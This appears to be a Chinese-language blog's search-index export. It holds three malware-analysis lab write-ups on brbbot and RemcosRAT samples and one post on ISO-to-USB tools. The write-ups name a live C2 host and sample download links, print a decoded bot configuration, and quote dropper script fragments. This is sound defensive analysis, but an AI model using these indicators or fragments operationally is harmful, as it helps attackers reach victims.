<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>【惡意軟體分析】brbbot.exe - 01</title>
    <url>/posts/10046/</url>
    <content><![CDATA[<hr>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
</blockquote>
<font size='3'>
在本練習中，我們將對 brbbot.exe 惡意軟體進行靜態和動態分析，透過分析其樣本來了解其行為。
</font>

<br>

<hr>
<span id="more"></span>

<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
<li><p><font size='3'>Linux Remnux ( Static Analysis )</font></p>
</li>
<li><p><font size='3'>Windows 11 ( Dynamic Analysis )</font></p>
</li>
<li><p><a href='https://bazaar.abuse.ch/sample/f47060d0f7de5ee651878eb18dd2d24b5003bdb03ef4f49879f448f05034a21e' target='_blank'><font size='3' color='#33ccff'>Brbbot.exe</font></a></p>
</li>
<li><p><font size='3'>HASH256：<code>b5af21afb00513a30d718f8b818e766b092ef83fb172039feea8f26a27e38e74</code></font></p>
</li>
</ul>
<hr>
<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
<br>

<h4 id="🛠️-Static-Analysis-Tools："><a href="#🛠️-Static-Analysis-Tools：" class="headerlink" title="🛠️ Static Analysis Tools："></a>🛠️ Static Analysis Tools：</h4><ul>
<li><font size='3'>file → 檢視文件類型</font></li>
<li><font size='3'>md5sum → 產生樣本的雜湊值</font></li>
<li><font size='3'>Strings → 提取字串</font></li>
<li><font size='3'>PeStudio → 查看執行檔</font></li>
<li><font size='3'>Virustotal   → 查看執行檔</font></li>
</ul>
<br>

<hr>
<br>

<h4 id="1️⃣-File-Type"><a href="#1️⃣-File-Type" class="headerlink" title="1️⃣ File Type"></a>1️⃣ File Type</h4><ul>
<li><font size='3'>檔案的名稱、副檔名皆可以更改，所以需要檢查檔案類型。</font></li>
</ul>
<br>

<p><img data-src='file.png' alt='File Type'></img></p>
<br>

<h4 id="2️⃣-Fingerprinting"><a href="#2️⃣-Fingerprinting" class="headerlink" title="2️⃣ Fingerprinting"></a>2️⃣ Fingerprinting</h4><ul>
<li><font size='3'>Hash 基本上是唯一值，故可以拿來檢驗該檔案是否遭受變更 或者 該檔案為惡意軟體。</font></li>
</ul>
<br>

<p><img data-src='md5.png' width='100%' alt='Fingerprinting'></img></p>
<br>

<h4 id="3️⃣-Virustotal"><a href="#3️⃣-Virustotal" class="headerlink" title="3️⃣ Virustotal"></a>3️⃣ Virustotal</h4><ul>
<li>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄</li>
</ul>
<br>

<p><img data-src='virustotal.png' width='600' align='center' alt='virustotal'></img></p>
<br>

<h4 id="4️⃣-Strings"><a href="#4️⃣-Strings" class="headerlink" title="4️⃣ Strings"></a>4️⃣ Strings</h4><ul>
<li><font size='3'>字串的提取可以從樣本中獲取一些有用的字串 ( 命令指令、控制 (C2) IP 、惡意 URL )。</font></li>
<li><font size='3'>❗Strings 可能不會獲取有用的資訊，有可能有進行代碼的加密。❗</font></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看到全部的 string</span></span><br><span class="line">strings brbbot.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 針對關鍵字尋找</span></span><br><span class="line">strings brbbot.exe | grep -iE <span class="string">&quot;http|https|cmd|powershell|.dll|.exe&quot;</span></span><br></pre></td></tr></table></figure>

<br>

<p><img data-src='strings.png' width='500' align='center' alt='Strings'></img><br><img data-src='pestudio-string.png' width='500' align='center' alt='PeStudio String'></img></p>
<br>

<ul>
<li><font size='3'>此案例就可以查看到一些資訊</font><ul>
<li><font size='3'>查看有哪些可疑的 DLL 、AutoRun 的字眼</font></li>
</ul>
</li>
</ul>
<br>

<p><img data-src='strings-1.png' width='500' align='center' alt='AutoRun'></img><br><img data-src='strings-2.png' width='500' align='center' alt='Dll'></img></p>
<br>

<hr>
<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
<br>

<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools:"></a>🛠️ Dynamic Analysis Tools:</h4><ul>
<li><font size='3'>Process Hacker</font></li>
<li><font size='3'>PEStudio</font></li>
<li><font size='3'>Wireshark</font></li>
</ul>
<br>

<hr>
<br>

<h4 id="1️⃣-Process-Hacker"><a href="#1️⃣-Process-Hacker" class="headerlink" title="1️⃣ Process Hacker"></a>1️⃣ Process Hacker</h4><ul>
<li>Process Hacker</li>
</ul>
<p><img data-src='process-hacker.png' width='500' align='center' alt='ProcessHacker'></img></p>
<br>

<h4 id="2️⃣-Wireshark"><a href="#2️⃣-Wireshark" class="headerlink" title="2️⃣ Wireshark"></a>2️⃣ Wireshark</h4><br>

<p><img data-src='wireshark.png' width='500' align='center' alt='WireShark DNS'></img></p>
<p><img data-src='wireshark-2.png' width='500' align='center' alt='WireShark HTTP'></img></p>
<br>

<h5 id="Wireshark-Observations"><a href="#Wireshark-Observations" class="headerlink" title="Wireshark Observations:"></a>Wireshark Observations:</h5><ul>
<li><font size='3'>觀察後可以看到有一個試圖連外面的封包 ( brb.3dtuts.by )</font></li>
<li><font size='3'>過濾 HTTP 可以看到一個試圖向外傳遞參數的封包</font></li>
</ul>
<br>

<blockquote>
<p><font size='3'>本篇有利用 Remnux 中的 fakedns 來進行欺騙，也是將詢問 brb.3dtuts.by 位置的封包回應成 Remnux IP，所以圖片中封包的目標 IP 才會是 Remnux 的 IP。</font></p>
</blockquote>
<br>

<hr>
<br>

<h4 id="1️⃣-x64dbg"><a href="#1️⃣-x64dbg" class="headerlink" title="1️⃣ x64dbg"></a>1️⃣ x64dbg</h4><br>

<p><img data-src='x64dbg-1.png' width='500' align='center' alt='將 brbbot.exe 檔案匯入, 設置斷點 SetBPX ReadFile'></img></p>
<br>

<p><img data-src='x64dbg-2.png' width='500' align='center' alt='運行程序直到斷點處'></img></p>
<br>

<p><img data-src='x64dbg-6.png' width='500' align='center' alt='查看右側 RCX 處數字 ( 138 ) '></img></p>
<br>

<p><img data-src='x64dbg-7.png' width='500' align='center' alt='至標籤 Handles 重新整理'></img></p>
<br>

<p><img data-src='x64dbg-8.png' width='500' align='center' alt='找尋 138 ，看到讀取的檔案及位置'></img></p>
<br>

<p><img data-src='x64dbg-3.png' width='500' align='center' alt='ALT + F9，跳過 windows API 回到惡意代碼'></img></p>
<br>

<p><img data-src='x64dbg-4.png' width='500' align='center' alt='找到編碼處，點選 F4 運行到該行'></img></p>
<br>

<p><img data-src='x64dbg-5.png' width='500' align='center' alt='得到編碼結果'></img></p>
<br>

<ul>
<li><font size='3'><code>uri=ads.php;exec=cexe;file=elif;conf=fnoc;exit=tixe;encode=5b;sleep=30000</code> </font></li>
<li><font size='3'>根據得到的字串可以猜測編碼可能為 XOR 5b，故嘗試將封包中傳遞的參數進行解密看看：</font></li>
</ul>
<br>

<p><img data-src='remnux-1.png' width='500' align='center' alt='至 Remnux 建立 encoded.hex 複製上去'></img></p>
<br>

<p><img data-src='remnux-2.png' width='500' align='center' alt='進行編碼轉換與解碼'></img></p>
<br>

  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 將 hex 格式轉換成原始二進制數據</span></span><br><span class="line">xxd -r -p encoded.hex &gt; encoded.raw</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 XOR 進行解碼</span></span><br><span class="line">translate.py encoded.raw decoded.txt <span class="string">&#x27;byte ^ 0x5b&#x27;</span></span><br></pre></td></tr></table></figure>

<br>

<ul>
<li><font size='3'>這個惡意程式的開發者定義了一套「命令對應機制」，我們在 brbconfig.tmp 找到了這些對應關係</font><ul>
<li>exit（退出）變成 tixe</li>
<li>config（設定）變成 fnoc</li>
<li>file（檔案）變成 elif</li>
<li>exec（執行）變成 cexe</li>
</ul>
</li>
</ul>
<p><img data-src='remnux-3.png' width='500' align='center' alt='通過 remnux 建立一個假的服務器，並建立 ads.php 來進行通訊'></img><br><img data-src='remnux-4.png' width='500' align='center' alt='可以看到通訊的時候會自動打開 notepad'></img></p>
<br>



<hr>
<br>

<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
<li><font size='3'>感染系統時生成一個編碼的 brbconfig.tmp 文件，並在創建後立即讀取該文件。</font></li>
<li><font size='3'>惡意程式還會在 <code>C:\Users\roydo\AppData\Roaming</code> 註冊表鍵中創建名為 <code>brbbot</code> 的項目，以保持系統持久存在。</font></li>
<li><font size='3'>透過DNS成功解析主機名後，試圖透過HTTP連接到 <code>brb.3dtuts.by</code></font></li>
<li><font size='3'>HTTP 請求中，樣本向 <code>/ads.php</code> 發送GET請求，包含數個參數，其中兩個參數反映受感染系統的相關數據，這些數據被外傳給攻擊者。</font></li>
</ul>
<br>

<hr>
<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
<li><font size='3'> <a href="https://medium.com/@deepu0092/malware-analysis-advanced-7bd3860f0d81">Malware Analysis — Advanced</a> </font></li>
<li><font size='3'>  <a href="https://medium.com/@deepu0092/malware-analysis-for-beginners-cd4185516d90">Malware Analysis for Beginners</a> </font></li>
</ul>
<br>]]></content>
      <categories>
        <category>analysis</category>
      </categories>
      <tags>
        <tag>analysis</tag>
        <tag>malware</tag>
        <tag>brbbot</tag>
        <tag>exe</tag>
      </tags>
  </entry>
  <entry>
    <title>【工具介紹】ISO 映像檔燒錄 USB 隨身碟</title>
    <url>/posts/5670/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h3><blockquote>
<p><font size='3'>這篇文章將詳細介紹如何將 ISO 映像檔燒錄到 USB 隨身碟。</font></p>
</blockquote>
<font size='3'>
無論你是要安裝新的操作系統、進行系統修復，還是需要創建可啟動的 USB 隨身碟，這篇指南都將提供你所需的步驟和工具。讓我們開始吧！
</font>

<span id="more"></span>

<h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><ol>
<li><h4 id="Rufus"><a href="#Rufus" class="headerlink" title="Rufus"></a><a href="https://rufus.ie/zh_TW/">Rufus</a></h4><p> <img data-src='rufus.png' width='300'></img></p>
<ul>
<li><font size='3'>步驟 1：下載安裝 Rufus</font></li>
<li><font size='3'>步驟 2：準備 USB 隨身碟</font></li>
<li><font size='3'>步驟 3：選擇 ISO檔來源、確認隨身碟位置（ 基本預設即可 ）</font></li>
<li><font size='3'>步驟 4：開始燒錄等待完成</font></li>
</ul>
</li>
<li><h4 id="Etcher"><a href="#Etcher" class="headerlink" title="Etcher"></a><a href="https://etcher.balena.io/">Etcher</a></h4><p> <img data-src='etcher.png' width='500'></img></p>
<ul>
<li><font size='3'>步驟 1：下載安裝 Etcher</font></li>
<li><font size='3'>步驟 2：準備 USB 隨身碟</font></li>
<li><font size='3'>步驟 3：選擇 ISO檔來源</font></li>
<li><font size='3'>步驟 4：確認隨身碟位置</font></li>
<li><font size='3'>步驟 5：開始燒錄等待完成</font></li>
</ul>
</li>
<li><h4 id="Ventoy"><a href="#Ventoy" class="headerlink" title="Ventoy"></a><a href="https://www.ventoy.net/en/download.html">Ventoy</a></h4><p> <img data-src='ventoy.png' width='300'></img></p>
<ul>
<li><font size='3'>步驟 1：下載安裝 Ventoy</font></li>
<li><font size='3'>步驟 2：準備 USB 隨身碟</font></li>
<li><font size='3'>步驟 3：打開 Ventoy2Disk.exe</font></li>
<li><font size='3'>步驟 4：確認隨身碟位置</font></li>
<li><font size='3'>步驟 5：選擇 Install</font></li>
<li><font size='3'>步驟 6：等待完成後，可直接將 ISO 直接丟到隨身碟中 （ Window 與 Linux 都可 ）</font></li>
</ul>
 <br>

 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"># 解壓縮後，執行</span><br><span class="line">bash VentoyWeb.sh</span><br><span class="line"></span><br><span class="line"># 打開網頁 24680 Port，接下來與 Windows 相同操作</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</li>
<li><h4 id="UNetbootin"><a href="#UNetbootin" class="headerlink" title="UNetbootin"></a><a href="https://unetbootin.github.io/">UNetbootin</a></h4><p> <img data-src='UNetbootin.png' width='500'></img></p>
<ul>
<li><font size='3'>步驟 1：下載安裝 UNetbootin</font></li>
<li><font size='3'>步驟 2：準備 USB 隨身碟</font></li>
<li><font size='3'>步驟 3：可選擇版本，軟體會自動幫忙下載，也可手動</font></li>
<li><font size='3'>步驟 4：確認隨身碟位置</font></li>
<li><font size='3'>步驟 5：開始燒錄等待完成</font></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>USB</tag>
        <tag>ISO</tag>
        <tag>Tool</tag>
      </tags>
  </entry>
  <entry>
    <title>【惡意軟體分析】- 02</title>
    <url>/posts/17031/</url>
    <content><![CDATA[<hr>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
</blockquote>
<font size='3'>
在本練習中，我們將對 RemcosRAT.exe 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
</font>

<br>

<hr>
<span id="more"></span>

<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
<li><p><font size='3'>Linux Remnux ( Static Analysis )</font></p>
</li>
<li><p><font size='3'>Windows 11 ( Dynamic Analysis )</font></p>
</li>
<li><p><a href='https://bazaar.abuse.ch/sample/ce39a137b9ff86bf23d7c62480a804e8d25c8b9154e9792b669374ac7f92e192/' target='_blank'><font size='3' color='#33ccff'>RemcosRAT.exe</font></a></p>
</li>
<li><p><font size='3'>HASH256：<code>ce39a137b9ff86bf23d7c62480a804e8d25c8b9154e9792b669374ac7f92e192</code></font></p>
</li>
</ul>
<hr>
<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
<br>

<h4 id="🛠️-Static-Analysis-Tools"><a href="#🛠️-Static-Analysis-Tools" class="headerlink" title="🛠️ Static Analysis Tools"></a>🛠️ Static Analysis Tools</h4><ul>
<li><font size='3'>file → 檢視文件類型</font></li>
<li><font size='3'>md5sum → 產生樣本的雜湊值</font></li>
<li><font size='3'>floss → 提取字串</font></li>
<li><font size='3'>Virustotal   → 查看執行檔</font></li>
<li><font size='3'>PEStudio → 提取多種關鍵資訊</font></li>
</ul>
<br>

<hr>
<br>

<h4 id="1️⃣-File-Type"><a href="#1️⃣-File-Type" class="headerlink" title="1️⃣ File Type"></a>1️⃣ File Type</h4><ul>
<li><font size='3'>檔案的名稱、副檔名皆可以更改，所以需要檢查檔案類型。</font></li>
</ul>
<br>

<p><img data-src='file.png' alt='知道該檔案確定是 PE32 格式'></img></p>
<br>

<h4 id="2️⃣-Fingerprinting"><a href="#2️⃣-Fingerprinting" class="headerlink" title="2️⃣ Fingerprinting"></a>2️⃣ Fingerprinting</h4><ul>
<li><font size='3'>Hash 基本上是唯一值，故可以拿來檢驗該檔案是否遭受變更 或者 該檔案為惡意軟體。</font></li>
</ul>
<br>

<p><img data-src='md5.png' width='100%' alt='查看 HASH 值'></img></p>
<br>

<h4 id="3️⃣-Virustotal"><a href="#3️⃣-Virustotal" class="headerlink" title="3️⃣ Virustotal"></a>3️⃣ Virustotal</h4><ul>
<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
</ul>
<br>

<p><img data-src='virustotal.png' width='600' align='center' alt='確定該檔案確實為惡意程式'></img></p>
<br>

<h4 id="4️⃣-Floss"><a href="#4️⃣-Floss" class="headerlink" title="4️⃣ Floss"></a>4️⃣ Floss</h4><ul>
<li><font size='3'>字串的提取可以從樣本中獲取一些有用的字串 ( 命令指令、控制 (C2) IP 、惡意 URL )。</font></li>
<li><font size='3'>❗可能無法完全解碼某些高度混淆的字符串❗</font></li>
</ul>
<br>

<p><img data-src='floss.png' width='500' align='center' alt='Floss'></img></p>
<br>

<h4 id="5️⃣-PEStudio"><a href="#5️⃣-PEStudio" class="headerlink" title="5️⃣ PEStudio"></a>5️⃣ PEStudio</h4><ul>
<li><font size='3'>mscoree.dll 主要用於啟動 .NET 應用程式，負責將 .NET 代碼轉換為機器碼執行。</font></li>
</ul>
<br>

<p><img data-src='pe-studio-1.png' width='600' align='center' alt='PE-Studio Library'></img></p>
<br>

<hr>
<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
<br>

<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools"></a>🛠️ Dynamic Analysis Tools</h4><ul>
<li><font size='3'>Procmon -&gt; 監控時間段的進程</font></li>
<li><font size='3'>AutoRuns -&gt; 查看進程</font><!-- - <font size='3'>Wireshark -> 查看封包狀況</font> --></li>
</ul>
<br>

<hr>
<br>

<h4 id="1️⃣-Procmon"><a href="#1️⃣-Procmon" class="headerlink" title="1️⃣ Procmon"></a>1️⃣ Procmon</h4><ul>
<li><font size='3'>查看有無錄製到可疑的路徑、檔案行為</font><ul>
<li><font size='3'>查找到有對兩個路徑的檔案進行更動 ( tmp 路徑下沒有檔案)</font></li>
</ul>
</li>
</ul>
<p><img data-src='procmon-1.png' width='700' align='center' alt='Procmon'></img></p>
<br>

<p><img data-src='logs.dat.png' width='700' align='center' alt='判斷為監控 Log'></img></p>
<br>

<h4 id="2️⃣-AutoRuns"><a href="#2️⃣-AutoRuns" class="headerlink" title="2️⃣ AutoRuns"></a>2️⃣ AutoRuns</h4><ul>
<li>查看有無可疑的路徑、檔案<ul>
<li>有添加到一個可疑排程</li>
</ul>
</li>
</ul>
<p><img data-src='autoruns-1.png' width='700' align='center' alt='AutoRuns'></img></p>
<br>

<p><img data-src='task-1.png' width='700' align='center' alt='排程'></img></p>
<br>

<p><img data-src='md5-2.png' width='700' align='center' alt='檢查 SzKneWgZlzw.exe 發現 hash 與原程式相同，故判斷為同一個檔案複製過去的'></img></p>
<br>

<hr>
<br>

<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
<li><font size='3'>該程式會偽裝成無害的檔案誘使受害者點擊。</font></li>
<li><font size='3'>點擊後惡意程式會複製程式移動位置、修改名稱、建立 Task Scheduler ，來保持系統持久存在。</font></li>
<li><font size='3'>建立排程 ( <code>C:\Users\Administrator\AppData\Roaming\SzKneWgZlzw.exe</code> ) ( 重新啟動後 <code>SzKneWgZlzw.exe</code> 開始運作 )。</font></li>
<li><font size='3'>移除 Task Scheduler 、 <code>SzKneWgZlzw.exe</code> 、 <code>logs.dat</code> 。</font></li>
</ul>
<br>

<hr>
<br>

<h4 id="❓-遭遇的問題"><a href="#❓-遭遇的問題" class="headerlink" title="❓ 遭遇的問題"></a>❓ 遭遇的問題</h4><ul>
<li><font size='3'>查找 <code>SzKneWgZlzw.exe</code> 的時候沒有看見檔案 </font></li>
</ul>
<p><img data-src='hide-malware.png' width='700' align='center' alt='關閉 Hide Protected operating system files'></img></p>
<br>

<hr>
<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
<li><font size='3'> <a href="https://medium.com/@cam40303/a-beginners-analysis-of-remcosrat-malware-524fa43a4992">A Beginner’s Analysis of RemcosRAT Malware
</a> </font></li>
</ul>
<br>

<!-- #### 🌐 Wireshark

<br>

<img data-src='wireshark.png' width='500' align='center' alt='WireShark DNS'></img>

<img data-src='wireshark-2.png' width='500' align='center' alt='WireShark HTTP'></img>

<br>

##### Wireshark Observations:
  - <font size='3'>觀察後可以看到有一個試圖連外面的封包 ( brb.3dtuts.by )</font>
  - <font size='3'>過濾 HTTP 可以看到一個試圖向外傳遞參數的封包</font>

<br>

> <font size='3'>本篇有利用 Remnux 中的 fakedns 來進行欺騙，也是將詢問 brb.3dtuts.by 位置的封包回應成 Remnux IP，所以圖片中封包的目標 IP 才會是 Remnux 的 IP。</font>

<br> -->

<hr>
<!-- <br>

#### 📝 x64dbg

<br>

<img data-src='x64dbg-1.png' width='500' align='center' alt='將 brbbot.exe 檔案匯入, 設置斷點 SetBPX ReadFile'></img>

<br>

<img data-src='x64dbg-2.png' width='500' align='center' alt='運行程序直到斷點處'></img>

<br>

<img data-src='x64dbg-6.png' width='500' align='center' alt='查看右側 RCX 處數字 ( 138 ) '></img>

<br>

<img data-src='x64dbg-7.png' width='500' align='center' alt='至標籤 Handles 重新整理'></img>

<br>

<img data-src='x64dbg-8.png' width='500' align='center' alt='找尋 138 ，看到讀取的檔案及位置'></img>

<br>

<img data-src='x64dbg-3.png' width='500' align='center' alt='ALT + F9，跳過 windows API 回到惡意代碼'></img>

<br>

<img data-src='x64dbg-4.png' width='500' align='center' alt='找到編碼處，點選 F4 運行到該行'></img>

<br>

<img data-src='x64dbg-5.png' width='500' align='center' alt='得到編碼結果'></img>

<br>

- <font size='3'>`uri=ads.php;exec=cexe;file=elif;conf=fnoc;exit=tixe;encode=5b;sleep=30000` </font>
- <font size='3'>根據得到的字串可以猜測編碼可能為 XOR 5b，故嘗試將封包中傳遞的參數進行解密看看：</font>

<br>

<img data-src='remnux-1.png' width='500' align='center' alt='至 Remnux 建立 encoded.hex 複製上去'></img>

<br>

<img data-src='remnux-2.png' width='500' align='center' alt='進行編碼轉換與解碼'></img>

<br>

  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 將 hex 格式轉換成原始二進制數據</span></span><br><span class="line">xxd -r -p encoded.hex &gt; encoded.raw</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 XOR 進行解碼</span></span><br><span class="line">translate.py encoded.raw decoded.txt <span class="string">&#x27;byte ^ 0x5b&#x27;</span></span><br></pre></td></tr></table></figure>

<br>

<ul>
<li><font size='3'>這個惡意程式的開發者定義了一套「命令對應機制」，我們在 brbconfig.tmp 找到了這些對應關係</font><ul>
<li>exit（退出）變成 tixe</li>
<li>config（設定）變成 fnoc</li>
<li>file（檔案）變成 elif</li>
<li>exec（執行）變成 cexe</li>
</ul>
</li>
</ul>
<p><img data-src='remnux-3.png' width='500' align='center' alt='通過 remnux 建立一個假的服務器，並建立 ads.php 來進行通訊'></img><br><img data-src='remnux-4.png' width='500' align='center' alt='可以看到通訊的時候會自動打開 notepad'></img></p>
<p><br> –&gt;</p>
<!-- bcdedit
vssadmin -->]]></content>
      <categories>
        <category>analysis</category>
      </categories>
      <tags>
        <tag>analysis</tag>
        <tag>malware</tag>
        <tag>exe</tag>
        <tag>RemcosRAT</tag>
      </tags>
  </entry>
  <entry>
    <title>【惡意軟體分析】- 03 - vbs</title>
    <url>/posts/32167/</url>
    <content><![CDATA[<hr>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
</blockquote>
<font size='3'>
在本練習中，我們將對 vbs 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
</font>

<br>

<hr>
<span id="more"></span>


<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
<li><p><font size='3'>Linux Remnux ( Static Analysis )</font></p>
</li>
<li><p><font size='3'>Windows 11 ( Dynamic Analysis )</font></p>
</li>
<li><p><a href='https://bazaar.abuse.ch/sample/01ed509842998f2309e2aa5ff2aaba7f12fec0e25c7a7a6f01d5d672c6a06363/' target='_blank'><font size='3' color='#33ccff'>RemcosRAT.vbs</font></a></p>
</li>
<li><p><font size='3'>HASH256：<code>01ed509842998f2309e2aa5ff2aaba7f12fec0e25c7a7a6f01d5d672c6a06363</code></font></p>
</li>
</ul>
<hr>
<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
<br>


<h4 id="🛠️-Static-Analysis-Tools"><a href="#🛠️-Static-Analysis-Tools" class="headerlink" title="🛠️ Static Analysis Tools"></a>🛠️ Static Analysis Tools</h4><ul>
<li><font size='3'>PEStudio → 提取多種關鍵資訊</font></li>
<li><font size='3'>Virustotal   → 檢查 hash</font></li>
</ul>
<br>

<hr>
<br>

<h4 id="1️⃣-PEStudio"><a href="#1️⃣-PEStudio" class="headerlink" title="1️⃣ PEStudio"></a>1️⃣ PEStudio</h4><ul>
<li><font size='3'>檔案的名稱、副檔名皆可以更改，所以需要檢查檔案類型。</font></li>
<li><font size='3'>查看檔案資訊是否有可疑地方</font><ul>
<li><font size='3'><code>CreateObject(&quot;Scripting.FileSystemObject&quot;)</code> ： 建立&#x2F;修改&#x2F;刪除檔案、寫入執行指令。</font></li>
<li><font size='3'><code>Set kSPdG = YIEhr.CreateTextFile(YoSeb &amp; &quot;\&quot; &amp; randomVBSBatName, True)&quot;</code> ： 建立一個 bat 檔案。</font></li>
</ul>
</li>
</ul>
<p><img data-src='pe-studio-1.png' align='center' width='700' alt='知道該檔案確定是 PE32 格式'></img></p>
<br>

<h4 id="2️⃣-Virustotal"><a href="#2️⃣-Virustotal" class="headerlink" title="2️⃣ Virustotal"></a>2️⃣ Virustotal</h4><ul>
<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
</ul>
<p><img data-src='virustotal.png' width='700' align='center' alt='確定該檔案確實為惡意程式'></img></p>
<br>

<h4 id="3️⃣-Virustotal"><a href="#3️⃣-Virustotal" class="headerlink" title="3️⃣ Virustotal"></a>3️⃣ Virustotal</h4><ul>
<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
</ul>
<br>


<hr>
<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
<br>

<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools"></a>🛠️ Dynamic Analysis Tools</h4><ul>
<li><font size='3'>Procmon -&gt; 監控時間段的進程</font></li>
<li><font size='3'>AutoRuns -&gt; 查看進程</font><!-- - <font size='3'>Wireshark -> 查看封包狀況</font> --></li>
</ul>
<br>

<hr>
<br>

<h4 id="1️⃣-Procmon"><a href="#1️⃣-Procmon" class="headerlink" title="1️⃣ Procmon"></a>1️⃣ Procmon</h4><ul>
<li><font size='3'>查看有無錄製到可疑的路徑、檔案行為</font><ul>
<li><font size='3'>找尋 <code>wscript.exe</code> ，確實看到一個在 <code>TMP</code> 下面的 <code>bat</code> 檔 ( 明顯有問題 )。</font></li>
</ul>
</li>
</ul>
<p><img data-src='procmon-1.png' width='700' align='center' alt='Procmon'></img></p>
<br>

<h4 id="2️⃣-AutoRuns"><a href="#2️⃣-AutoRuns" class="headerlink" title="2️⃣ AutoRuns"></a>2️⃣ AutoRuns</h4><ul>
<li>檢查有無可疑的路徑、檔案。<ul>
<li>找到一個可疑檔案 ( 名稱可以、副檔名不對、路徑不對、無憑證 )。</li>
</ul>
</li>
</ul>
<p><img data-src='autoruns-1.png' width='700' align='center' alt='AutoRuns'></img></p>
<br>

<hr>
<h4 id="1️⃣-vbsEdit"><a href="#1️⃣-vbsEdit" class="headerlink" title="1️⃣ vbsEdit"></a>1️⃣ vbsEdit</h4><ul>
<li><font size='3'>打開惡意程式</font></li>
</ul>
<p><img data-src='vba-edit-1.png' width='700' align='center' alt='使用 NotePad 查看代碼'></img></p>
<br>

<p><img data-src='vba-edit-2.png' width='700' align='center' alt='使用 VBAEdit 查看代碼'></img></p>
<br>

<hr>
<br>


<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
<li><p><font size='3'>該程式會偽裝成無害的檔案誘使受害者點擊。</font></p>
</li>
<li><p><font size='3'>移除：</font></p>
<ul>
<li><font size='3'><code>C:\Users\ADMINI~1\AppData\Local\Temp\1\IXeqOHqsNh.bat</code></font></li>
<li><font size='3'><code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start   Menu\Programs\Startup\StartupScript_7fff24c6.cmd</code></font></li>
</ul>
</li>
</ul>
<br>


<hr>
<br>

<h4 id="❓-遭遇的問題"><a href="#❓-遭遇的問題" class="headerlink" title="❓ 遭遇的問題"></a>❓ 遭遇的問題</h4><ul>
